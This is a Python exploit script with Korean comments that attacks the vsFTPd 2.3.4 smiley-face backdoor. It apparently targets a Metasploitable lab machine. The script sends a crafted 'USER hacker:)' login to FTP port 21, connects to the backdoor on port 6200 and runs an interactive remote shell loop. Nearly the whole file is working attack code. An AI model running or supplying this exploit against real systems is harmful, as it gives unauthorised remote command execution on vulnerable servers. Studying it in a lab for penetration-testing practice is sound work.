import socket
import time

# 1. 타겟 설정 (아까 스캔한 메타스플로이터블 IP)
target_ip = input("타겟 IP를 입력하세요: ")
target_port = 21  # FTP 포트

print(f"[*] {target_ip} 로 백도어 공격을 시도합니다...")

# 2. 1단계: 백도어 트리거 (스마일 이모티콘 보내기)
try:
    # 소켓 생성 및 FTP 연결
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    
    # 서버의 환영 메시지 받기 (Banner)
    banner = s.recv(1024).decode()
    print(f"[*] 서버 연결 성공: {banner.strip()}")
    
    # 악의적인 아이디 전송 (:) 스마일 포함)
    print("[*] 악성 페이로드(스마일) 전송 중...")
    s.send(b"USER hacker:)\r\n") 
    
    # 비밀번호는 아무거나 전송
    s.send(b"PASS 1234\r\n")
    
    # 서버가 백도어 포트(6200)를 열 때까지 잠시 대기
    time.sleep(2) 
    s.close()
    print("[*] 트리거 완료. 백도어 포트(6200) 접속 시도 중...")

except Exception as e:
    print(f"[-] 연결 실패: {e}")
    exit()

# 3. 2단계: 열린 뒷문(6200번)으로 들어가기
try:
    # 새 소켓으로 6200번 포트 접속
    backdoor_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    backdoor_s.connect((target_ip, 6200))
    
    print("\n[!!!] 침투 성공! 쉘 권한을 획득했습니다. [!!!]")
    print("명령어를 입력하세요 (종료하려면 'exit')\n")
    
    # 4. 쉘 명령어 주고받기 (해커의 채팅 프로그램과 같은 원리)
    while True:
        cmd = input("Shell> ")
        if cmd == 'exit':
            break
            
        # 명령어 전송 (엔터키 포함)
        backdoor_s.send(cmd.encode() + b'\n')
        
        # 결과 수신
        response = backdoor_s.recv(4096).decode()
        print(response)
        
except Exception as e:
    print(f"[-] 백도어 접속 실패: {e}")
    print("    (이 서버는 vsFTPd 2.3.4 취약점이 없거나 방화벽에 막혔을 수 있습니다.)")